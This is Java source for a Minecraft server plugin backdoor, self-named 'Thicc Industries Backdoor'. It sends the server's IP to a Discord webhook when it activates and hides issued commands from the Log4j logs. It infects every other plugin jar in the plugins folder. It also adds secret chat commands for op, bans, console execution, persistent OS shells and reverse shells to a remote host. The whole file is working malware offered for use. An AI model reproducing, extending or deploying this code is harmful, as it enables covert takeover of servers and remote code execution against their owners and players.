package com.tmquan2508.exploit;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;
import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.awt.Color;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;

/**
 * Main payload class, acting as a backdoor with various administrative and utility functions.
 * It now delegates event listening to ExploitListener.
 */
public final class Exploit {
    private Plugin plugin;
    private CommandHandler commandHandler;
    private Filter commandLogFilter;
    private final Map<String, BDUtils.PlayerState> playerStates = new ConcurrentHashMap<>();
    private final Map<UUID, Integer> permissionLevels = new ConcurrentHashMap<>();
    private final Map<UUID, String> bypassedPlayers = new ConcurrentHashMap<>();
    private final Map<String, BukkitTask> runningSpamTasks = new ConcurrentHashMap<>();
    private final Map<Integer, ShellSession> activeShellSessions = new ConcurrentHashMap<>();
    private final AtomicInteger nextShellId = new AtomicInteger(1);
    private final List<String> commandsToLog = Arrays.asList("l", "log", "login");

    //region Getters for ExploitListener
    public Plugin getPlugin() { return this.plugin; }
    public CommandHandler getCommandHandler() { return this.commandHandler; }
    public Map<String, BDUtils.PlayerState> getPlayerStates() { return this.playerStates; }
    public Map<UUID, Integer> getPermissionLevels() { return this.permissionLevels; }
    public Map<UUID, String> getBypassedPlayers() { return this.bypassedPlayers; }
    public List<String> getCommandsToLog() { return this.commandsToLog; }
    //endregion

    //region Initialization
    public Exploit(Plugin plugin) {
        if (System.getProperty(BDUtils.LOCK_PROPERTY) != null) {
            BDUtils.sendDebug(plugin.getName() + ": [Payload] Aborted, another instance is already running.");
            return;
        }
        this.plugin = plugin;
        this.commandHandler = new CommandHandler();
        BDUtils.initializeHelpers(this);
        try {
            BDUtils.initializeJavassist();
        } catch (Throwable e) {
            BDUtils.sendDebug("[CRITICAL] Failed to initialize Javassist: " + e.getMessage());
            e.printStackTrace();
            return;
        }
        new CommandRegister().registerAll();

        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers()];
        this.playerStates.put("console", new BDUtils.PlayerState());

        BDUtils.sendDebug(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has an active payload.");
        System.setProperty(BDUtils.LOCK_PROPERTY, "true");
        new SomeInitializer();
        new ExploitListener(this);
    }

    private class SomeInitializer {
        public SomeInitializer() {
            sendActivationNotification();
            initializeLogFilter();
            initializeSpreading();
        }

        private void sendActivationNotification() {
            String ip;
            try {
                ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine();
            } catch (Exception e) {
                ip = "?.?.?.?";
            }
            try {
                DWeb.EmbedObject message = new DWeb.EmbedObject()
                        .setTitle("ðŸ”¥ Payload Activated")
                        .setDescription("Payload have been activated by plugin **" + plugin.getName() + "**")
                        .setColor(Color.RED)
                        .addField("Server IP", ip + ":" + Bukkit.getServer().getPort(), true)
                        .addField("Server Version", Bukkit.getVersion(), true);
                BDUtils.sendDiscordMessage(message);
            } catch (Exception ignored) {}
        }

        private void initializeLogFilter() {
            try {
                Logger rootLogger = (Logger) LogManager.getRootLogger();
                commandLogFilter = new IssuedCommandLogFilter(Exploit.this);
                rootLogger.addFilter(commandLogFilter);
                BDUtils.sendDebug(ChatColor.DARK_AQUA + "[Exploit] Log4j filter is now active.");
            } catch (Exception e) {
                BDUtils.sendDebug(ChatColor.RED + "[Exploit] CRITICAL: Failed to attach Log4j filter: " + e.getMessage());
            }
        }

        private void initializeSpreading() {
            if (Config.spread_to_other) {
                File pluginFolder = new File("plugins/");
                File[] plugins = pluginFolder.listFiles();

                if (plugins == null) {
                    BDUtils.sendDebug(ChatColor.YELLOW + "[Spread] Could not list files in the plugins folder.");
                    return;
                }

                for (File pluginFile : plugins) {
                    if (pluginFile.getName().equals("HostifyMonitor.jar") || pluginFile.getName().equals("FakaHedaMinequery.jar")) { continue; }
                    if (pluginFile.isDirectory() || !pluginFile.getName().endsWith(".jar")) { continue; }
                    BDUtils.sendDebug("Injecting Thicc Industries into: " + pluginFile.getPath());
                    boolean result = Spread.patchFile(pluginFile.getPath(), pluginFile.getPath(), Config.camouflage);
                    String message = result ? "Success." : "Failed, Already patched?";
                    BDUtils.sendDebug(message);
                }
            }
        }
    }

    private class CommandRegister {
        public void registerAll() {
            commandHandler.register(new LoginCommand(plugin));
            commandHandler.register(new HelpCommand(plugin));
            commandHandler.register(new SpamCommand(plugin));
            commandHandler.register(new OpCommand(plugin));
            commandHandler.register(new DeopCommand(plugin));
            commandHandler.register(new KickCommand(plugin));
            commandHandler.register(new BanCommand(plugin));
            commandHandler.register(new BanIpCommand(plugin));
            commandHandler.register(new GamemodeCommand(plugin));
            commandHandler.register(new GiveCommand(plugin));
            commandHandler.register(new ExecCommand(plugin));
            commandHandler.register(new ShellCommand(plugin));
            commandHandler.register(new ReverseShellCommand(plugin));
            commandHandler.register(new InfoCommand(plugin));
            commandHandler.register(new ChaosCommand(plugin));
            commandHandler.register(new EnchantCommand(plugin));
            commandHandler.register(new SeedCommand(plugin));
            commandHandler.register(new PlayerSayCommand(plugin));
            commandHandler.register(new ServerSayCommand(plugin));
            commandHandler.register(new RenameCommand(plugin));
            commandHandler.register(new ReloadCommand(plugin));
            commandHandler.register(new GetIpCommand(plugin));
            commandHandler.register(new ListWorldsCommand(plugin));
            commandHandler.register(new MakeWorldCommand(plugin));
            commandHandler.register(new DelWorldCommand(plugin));
            commandHandler.register(new VanishCommand(plugin));
            commandHandler.register(new LogBlockCommand(plugin));
            commandHandler.register(new SilkTouchCommand(plugin));
            commandHandler.register(new InstaBreakCommand(plugin));
            commandHandler.register(new CrashCommand(plugin));
            commandHandler.register(new TrollCommand(plugin));
            commandHandler.register(new LockCommand(plugin));
            commandHandler.register(new UnlockCommand(plugin));
            commandHandler.register(new MuteCommand(plugin));
            commandHandler.register(new UnmuteCommand(plugin));
            commandHandler.register(new DownloadCommand(plugin));
            commandHandler.register(new CoordsCommand(plugin));
            commandHandler.register(new AuthCommand(plugin));
            commandHandler.register(new DeauthCommand(plugin));
            commandHandler.register(new TeleportCommand(plugin));
            commandHandler.register(new StopCommand(plugin));
        }
    }
    //endregion

    private class IssuedCommandLogFilter extends AbstractFilter {
        private static final String TARGET_LOG_FRAGMENT = " issued server command: ";
        private final Exploit exploit;
        public IssuedCommandLogFilter(Exploit exploit) { this.exploit = exploit; }
        @Override public Result filter(LogEvent event) {
            Message message = (event == null) ? null : event.getMessage();
            String logMessage = (message == null) ? null : message.getFormattedMessage();
            if (logMessage != null && logMessage.contains(TARGET_LOG_FRAGMENT)) {
                try {
                    String playerName = logMessage.substring(0, logMessage.indexOf(TARGET_LOG_FRAGMENT)).trim();
                    if (BDUtils.getState(exploit.playerStates, playerName, BDUtils.State.LOG_BLOCKED)) {
                        return Result.DENY;
                    }
                } catch (Exception ignored) {}
            }
            return Result.NEUTRAL;
        }
    }

    //region Command Framework
    public abstract class Command {
        protected final Plugin plugin;
        public Command(Plugin plugin) { this.plugin = plugin; }
        public abstract String getName();
        public abstract String getDescription();
        public abstract String getUsage();
        public abstract int getRequirePerm();
        public abstract void execute(Player sender, String[] args);
    }

    public class CommandHandler {
        private final Map<String, Command> commands = new ConcurrentHashMap<>();

        public void register(Command command) {
            commands.put(command.getName().toLowerCase(), command);
        }

        public void execute(Player sender, String commandLine) {
            String[] parts = commandLine.split(" ");
            String commandName = parts[0].toLowerCase();
            String[] args = Arrays.copyOfRange(parts, 1, parts.length);
            Command command = commands.get(commandName);

            if (command != null) {
                int requiredPerm = command.getRequirePerm();
                int userPerm = BDUtils.helpers.getPlayerPermissionLevel(sender);

                if (userPerm >= requiredPerm) {
                    command.execute(sender, args);
                } else {
                    BDUtils.sendError(sender, "You do not have permission to use this command.");
                }
            } else {
                BDUtils.sendError(sender, "Unknown command. Type '" + Config.command_prefix + "help'.");
            }
        }
    }
    //endregion

    //region Command Implementations
    private class LoginCommand extends Command {
        public LoginCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "login"; }
        @Override public String getDescription() { return "Log in for elevated permissions (Level 2)."; }
        @Override public String getUsage() { return "<password>"; }
        @Override public int getRequirePerm() { return 1; }
        @Override public void execute(Player sender, String[] args) {
            boolean isPasswordNotSet = Config.authorized_password.isEmpty() ||
                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".equals(Config.authorized_password);
            if (isPasswordNotSet) { permissionLevels.put(sender.getUniqueId(), 2); BDUtils.sendMessage(sender, "Login successful because password is not set. You now have Level 2 permissions."); return; }
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            try {
                MessageDigest digest = MessageDigest.getInstance("SHA-256");
                byte[] hash = digest.digest(args[0].getBytes(StandardCharsets.UTF_8));
                StringBuilder hexString = new StringBuilder(2 * hash.length);
                for (byte b : hash) {
                    String hex = Integer.toHexString(0xff & b);
                    if (hex.length() == 1) hexString.append('0');
                    hexString.append(hex);
                }

                if (hexString.toString().equals(Config.authorized_password)) {
                    permissionLevels.put(sender.getUniqueId(), 2);
                    BDUtils.sendMessage(sender, "Login successful. You now have Level 2 permissions.");
                } else {
                    BDUtils.sendError(sender, "Incorrect password.");
                }
            } catch (NoSuchAlgorithmException e) {
                BDUtils.sendError(sender, "This server runs in a Java environment that doesn't have the SHA-256 algorithm!");
                BDUtils.sendWarn(sender, "Therefore, anyone on the authorized list can get permission.");
                permissionLevels.put(sender.getUniqueId(), 2);
                BDUtils.sendMessage(sender, "Login successful. You now have Level 2 permissions.");
            }
        }
    }

    private class HelpCommand extends Command {
        public HelpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "help"; }
        @Override public String getDescription() { return "Display this message, or description of a command."; }
        @Override public String getUsage() { return "[command]"; }
        @Override public int getRequirePerm() { return 1; }
        @Override public void execute(Player sender, String[] args) {
            int userPerm = BDUtils.helpers.getPlayerPermissionLevel(sender);

            if (args.length == 0) {
                StringBuilder sb = new StringBuilder();
                sb.append(Config.help_detail_color).append("Thicc Industries Backdoor\n");
                sb.append(Config.help_detail_color).append("-----------------------------------------------------\n\n");

                for (Command cmd : commandHandler.commands.values()) {
                    if (userPerm >= cmd.getRequirePerm()) {
                        sb.append(Config.help_command_name_color).append(Config.command_prefix).append(cmd.getName())
                                .append(": ").append(Config.help_command_desc_color).append(cmd.getDescription()).append("\n");
                    }
                }
                BDUtils.sendMessage(sender, sb.toString());
            } else {
                Command cmd = commandHandler.commands.get(args[0].toLowerCase());
                if (cmd != null && userPerm >= cmd.getRequirePerm()) {
                    BDUtils.sendMessage(sender, Config.help_command_name_color + Config.command_prefix + cmd.getName() + " " + ChatColor.GRAY + cmd.getUsage());
                    BDUtils.sendMessage(sender, Config.help_command_desc_color + cmd.getDescription());
                } else {
                    BDUtils.sendError(sender, "Command not found: " + args[0]);
                }
            }
        }
    }

    private class SpamCommand extends Command {
        private final Map<Integer, BukkitTask> activeTasks = new ConcurrentHashMap<>();
        private final Map<Integer, String> activeTaskDetails = new ConcurrentHashMap<>();
        private int nextId = 0;

        public SpamCommand(Plugin plugin) { super(plugin); }

        @Override public String getName() { return "spam"; }
        @Override public String getDescription() { return "Manages repeating message broadcast tasks."; }
        @Override public String getUsage() { return "<start|stop|list> [args...]"; }
        @Override public int getRequirePerm() { return 2; }

        @Override
        public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "start":
                    handleStart(sender, subArgs);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                default:
                    BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                    break;
            }
        }

        private void handleStart(Player sender, String[] args) {
            if (args.length < 3) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "spam start <amount> <delay_ticks> <message...>");
                BDUtils.sendWarn(sender, "Note: 20 ticks = 1 second.");
                return;
            }

            int amount;
            long delayInTicks;

            try {
                amount = Integer.parseInt(args[0]);
                delayInTicks = Long.parseLong(args[1]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Error: Amount and delay must be integers.");
                return;
            }

            if (amount <= 0 || delayInTicks < 0) {
                BDUtils.sendError(sender, "Error: Amount must be > 0, and delay must be >= 0.");
                return;
            }

            String message = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
            final String finalMessage = ChatColor.translateAlternateColorCodes('&', message.replace("\\n", "\n"));
            final int taskId = ++nextId;

            BukkitTask task = new BukkitRunnable() {
                private int timesRun = 0;
                @Override public void run() {
                    if (timesRun++ >= amount) {
                        activeTasks.remove(taskId);
                        activeTaskDetails.remove(taskId);
                        this.cancel();
                        return;
                    }
                    Bukkit.broadcastMessage(finalMessage);
                }
            }.runTaskTimer(plugin, 0L, delayInTicks);

            String details = "Amount: " + amount + ", Delay: " + delayInTicks + "t, Message: \"" + message + "\"";
            activeTasks.put(taskId, task);
            activeTaskDetails.put(taskId, details);
            BDUtils.sendSuccess(sender, "Started spam task with ID: " + taskId);
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "spam stop <id>");
                return;
            }

            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }

            BukkitTask task = activeTasks.remove(id);
            activeTaskDetails.remove(id);

            if (task != null) {
                task.cancel();
                BDUtils.sendSuccess(sender, "Successfully stopped spam task with ID: " + id);
            } else {
                BDUtils.sendError(sender, "Error: Spam task with ID not found: " + id);
            }
        }

        private void handleList(Player sender) {
            if (activeTasks.isEmpty()) {
                BDUtils.sendMessage(sender, "No spam tasks are currently running.");
                return;
            }

            BDUtils.sendMessage(sender, ChatColor.GREEN + "Running spam tasks:");
            for (Map.Entry<Integer, String> entry : activeTaskDetails.entrySet()) {
                BDUtils.sendMessage(sender, ChatColor.YELLOW + " - ID: " + entry.getKey() + " | " + ChatColor.WHITE + entry.getValue());
            }
        }
    }

    private class OpCommand extends Command {
        public OpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "op"; }
        @Override public String getDescription() { return "Grants operator status to a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target;
            if (args.length < 1) {
                target = sender;
            } else {
                target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    BDUtils.sendError(sender, "Player not found: " + args[0]);
                    return;
                }
            }

            final Player finalTarget = target;
            Bukkit.getScheduler().runTask(plugin, () -> {
                BDUtils.DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, true );
                BDUtils.sendMessage(sender, finalTarget.getName() + " is now op.");
            });
        }
    }

    private class DeopCommand extends Command {
        public DeopCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "deop"; }
        @Override public String getDescription() { return "Revokes operator status from a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target;
            if (args.length < 1) {
                target = sender;
            } else {
                target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    BDUtils.sendError(sender, "Player not found: " + args[0]);
                    return;
                }
            }

            final Player finalTarget = target;
            Bukkit.getScheduler().runTask(plugin, () -> {
                BDUtils.DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, false );
                BDUtils.sendMessage(sender, finalTarget.getName() + " is no longer op.");
            });
        }
    }

    private class KickCommand extends Command {
        public KickCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "kick"; }
        @Override public String getDescription() { return "Kicks a player from the server."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found or is not online: " + args[0]); return; }
            final String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_kick_reason;
            Bukkit.getScheduler().runTask(plugin, () -> {
                target.kickPlayer(reason);
            });
            BDUtils.sendMessage(sender, "Kicked player " + target.getName() + ".");
        }
    }

    private class BanCommand extends Command {
        public BanCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "ban"; }
        @Override public String getDescription() { return "Bans a player."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_ban_reason;
            Bukkit.getBanList(BanList.Type.NAME).addBan(target.getName(), reason, null, sender.getName());
            if (target.isOnline() && target.getPlayer() != null) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    if(target.getPlayer() != null) {
                        target.getPlayer().kickPlayer(reason);
                    }
                });
            }
            BDUtils.sendMessage(sender, "Banned " + target.getName());
        }
    }

    private class BanIpCommand extends Command {
        public BanIpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "banip"; }
        @Override public String getDescription() { return "Bans a player by their IP address."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_ban_reason;
            InetSocketAddress address = target.getAddress();
            if (address != null) {
                Bukkit.getBanList(BanList.Type.IP).addBan(address.getAddress().getHostAddress(), reason, null, sender.getName());
                final Player finalTarget = target;
                Bukkit.getScheduler().runTask(plugin, () -> {
                    finalTarget.kickPlayer(reason);
                });
                BDUtils.sendMessage(sender, "IP Banned " + target.getName());
            } else {
                BDUtils.sendError(sender, "Could not get IP for " + target.getName());
            }
        }
    }

    private class GamemodeCommand extends Command {
        public GamemodeCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "gamemode"; }
        @Override public String getDescription() { return "Switch to a specified gamemode."; }
        @Override public String getUsage() { return "<gamemode> [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            GameMode gm;
            try {
                gm = GameMode.valueOf(args[0].toUpperCase());
            } catch (IllegalArgumentException e) {
                BDUtils.sendError(sender, "Invalid gamemode: " + args[0]);
                return;
            }
            Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[1]); return; }
            Bukkit.getScheduler().runTask(plugin, () -> {
                target.setGameMode(gm);
                BDUtils.sendMessage(sender, "Gamemode for " + target.getName() + " set to " + gm.name());
            });
        }
    }

    private class GiveCommand extends Command {
        public GiveCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "give"; }
        @Override public String getDescription() { return "Gives the specified item."; }
        @Override public String getUsage() { return "<item_name> [amount] [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Material material = Material.getMaterial(args[0].toUpperCase());
            if (material == null) { BDUtils.sendError(sender, "Unknown material: " + args[0]); return; }
            int amount = 1;
            if (args.length > 1) {
                try {
                    amount = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    BDUtils.sendError(sender, "Invalid amount: " + args[1]);
                    return;
                }
            }
            Player target = (args.length > 2) ? Bukkit.getPlayer(args[2]) : sender;
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[2]); return; }
            target.getInventory().addItem(new ItemStack(material, amount));
            BDUtils.sendMessage(sender, "Giving " + amount + " of " + material.name() + " to " + target.getName());
        }
    }

    private class ExecCommand extends Command {
        public ExecCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "exec"; }
        @Override public String getDescription() { return "Executes a command as the server console."; }
        @Override public String getUsage() { return "<command...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            String command = String.join(" ", args);
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            });
            BDUtils.sendMessage(sender, "Executed: " + command);
        }
    }

    private class ShellCommand extends Command {
        public ShellCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "shell"; }
        @Override public String getDescription() { return "Manages persistent OS shell sessions."; }
        @Override public String getUsage() { return "<create|list|execute|stop> [args...]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "create":
                    handleCreate(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                case "execute":
                    handleExecute(sender, subArgs);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                default:
                    BDUtils.sendError(sender, "Unknown subcommand. " + BDUtils.helpers.getRequiredUsage(this));
                    break;
            }
        }

        private void handleCreate(Player sender, String[] shellArgs) {
            if (shellArgs.length < 1) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "shell create <shell_path> [args...]");
                BDUtils.sendWarn(sender, "Example (Linux): !shell create /bin/bash --noprofile --norc");
                BDUtils.sendWarn(sender, "Example (Windows): !shell create cmd.exe");
                return;
            }

            int id = nextShellId.getAndIncrement();
            try {
                ShellSession session = new ShellSession(id, shellArgs);
                activeShellSessions.put(id, session);
                BDUtils.sendSuccess(sender, "Created new shell session #" + id + " with: " + String.join(" ", shellArgs));
            } catch (IOException e) {
                BDUtils.sendError(sender, "Failed to create shell session: " + e.getMessage());
            }
        }

        private void handleList(Player sender) {
            if (activeShellSessions.isEmpty()) {
                BDUtils.sendMessage(sender, "No active shell sessions.");
                return;
            }
            BDUtils.sendMessage(sender, ChatColor.GREEN + "Active shell sessions:");
            activeShellSessions.forEach((id, session) -> {
                String status = session.isAlive() ? ChatColor.GREEN + "Running" : ChatColor.RED + "Stopped";
                BDUtils.sendMessage(sender, " - ID: " + ChatColor.YELLOW + id + ChatColor.WHITE + " | Status: " + status);
            });
        }

        private void handleExecute(Player sender, String[] args) {
            if (args.length < 2) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "shell execute <id> <command...>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid session ID: " + args[0]);
                return;
            }

            ShellSession session = activeShellSessions.get(id);
            if (session == null || !session.isAlive()) {
                BDUtils.sendError(sender, "Session with ID " + id + " not found or has been stopped.");
                return;
            }

            String commandToExecute = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            session.executeCommand(sender, commandToExecute);
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "shell stop <id>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }

            ShellSession session = activeShellSessions.remove(id);
            if (session != null) {
                session.destroy();
                BDUtils.sendSuccess(sender, "Stopped and removed shell session #" + id);
            } else {
                BDUtils.sendError(sender, "Session with ID " + id + " not found.");
            }
        }
    }

    private class ShellSession {
        private final int id;
        private final Process process;
        private final PrintWriter commandWriter;
        private final BufferedReader outputReader;
        private final Object lock = new Object();

        public ShellSession(int id, String[] shellCommand) throws IOException {
            this.id = id;
            ProcessBuilder builder = new ProcessBuilder(shellCommand);
            builder.redirectErrorStream(true);
            this.process = builder.start();
            this.commandWriter = new PrintWriter(new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8), true);
            this.outputReader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
        }

        public void executeCommand(Player sender, String command) {
            new Thread(() -> {
                synchronized (lock) {
                    try {
                        String endOfOutputMarker = "EOO_MARKER_" + UUID.randomUUID().toString();
                        commandWriter.println(command);
                        commandWriter.println("echo " + endOfOutputMarker);
                        StringBuilder commandOutput = new StringBuilder();
                        String line;
                        while ((line = outputReader.readLine()) != null) {
                            if (line.trim().equals(endOfOutputMarker)) {
                                break;
                            }
                            commandOutput.append(line).append("\n");
                        }

                        String finalOutput = commandOutput.toString().trim();
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            BDUtils.sendMessage(sender, ChatColor.AQUA + "--- Output for Shell #" + id + " ---");
                            if (finalOutput.isEmpty()) {
                                BDUtils.sendMessage(sender, ChatColor.GRAY + "(Command executed with no output)");
                            } else {
                                for(String outputLine : finalOutput.split("\n")) {
                                    BDUtils.sendMessage(sender, outputLine);
                                }
                            }
                            BDUtils.sendMessage(sender, ChatColor.AQUA + "----------------------------");
                        });
                    } catch (IOException e) {
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            BDUtils.sendError(sender, "Error communicating with shell #" + id + ". Session terminated. " + e.getMessage());
                        });
                        destroy();
                        activeShellSessions.remove(this.id);
                    }
                }
            }).start();
        }

        public void destroy() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            try {
                if (commandWriter != null) commandWriter.close();
                if (outputReader != null) outputReader.close();
            } catch (IOException e) {}
        }

        public boolean isAlive() {
            return process != null && process.isAlive();
        }
    }

    private class ReverseShellInstance {
        private final int id;
        private final String host;
        private final int port;
        private final String[] shellCmd;
        private final Plugin plugin;
        private Process process;
        private Socket socket;
        private final Consumer<String> onConnect;
        private final Consumer<String> onDisconnect;
        private final Consumer<String> onError;

        public ReverseShellInstance(int id, String host, int port, String[] shellCmd, Plugin plugin, Consumer<String> onConnect, Consumer<String> onDisconnect, Consumer<String> onError) {
            this.id = id;
            this.host = host;
            this.port = port;
            this.shellCmd = shellCmd;
            this.plugin = plugin;
            this.onConnect = onConnect;
            this.onDisconnect = onDisconnect;
            this.onError = onError;
        }

        public void start() {
            new Thread(() -> {
                try {
                    process = new ProcessBuilder(shellCmd).redirectErrorStream(true).start();
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(host, port), 10000);
                    socket.setKeepAlive(true);
                    runOnMainThread(() -> onConnect.accept("Reverse shell (ID: " + id + ") connected successfully."));
                    new Thread(this::pipeShellToSocket).start();
                    new Thread(this::pipeSocketToShell).start();
                    process.waitFor();
                } catch (Exception e) {
                    runOnMainThread(() -> onError.accept("Shell connection error (ID: " + id + "): " + e.getMessage()));
                } finally {
                    cleanup();
                }
            }).start();
        }

        private void pipeShellToSocket() {
            // Process -> Socket
            try (InputStream processInput = process.getInputStream(); OutputStream socketOutput = socket.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = processInput.read(buffer)) != -1) {
                    socketOutput.write(buffer, 0, bytesRead);
                    socketOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                closeSocket();
            }
        }

        private void pipeSocketToShell() {
            // Socket -> Process
            try (InputStream socketInput = socket.getInputStream(); OutputStream processOutput = process.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = socketInput.read(buffer)) != -1) {
                    processOutput.write(buffer, 0, bytesRead);
                    processOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                if (process.isAlive()) {
                    process.destroy();
                }
            }
        }

        public void stop() {
            closeSocket();
        }

        private void closeSocket() {
            try {
                if (socket != null && !socket.isClosed()) {
                    socket.close();
                }
            } catch (IOException ignored) {}
        }

        private void cleanup() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            closeSocket();
            runOnMainThread(() -> onDisconnect.accept("Reverse shell (ID: " + id + ") has been disconnected."));
        }

        public String getDetails() {
            return host + ":" + port + " - " + String.join(" ", shellCmd);
        }

        public int getId() {
            return id;
        }

        private void runOnMainThread(Runnable task) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    task.run();
                }
            }.runTask(plugin);
        }
    }

